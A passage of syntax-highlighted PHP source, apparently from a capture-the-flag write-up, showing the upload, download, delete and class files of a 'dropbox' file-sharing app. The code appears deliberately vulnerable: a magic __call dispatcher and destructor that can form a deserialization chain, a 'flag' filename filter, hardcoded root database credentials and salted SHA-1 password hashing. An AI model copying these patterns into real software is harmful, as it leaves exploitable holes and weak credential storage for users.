punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Only gif/jpg/png allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dst</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token variable">$fileext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Invaild filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename="</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" 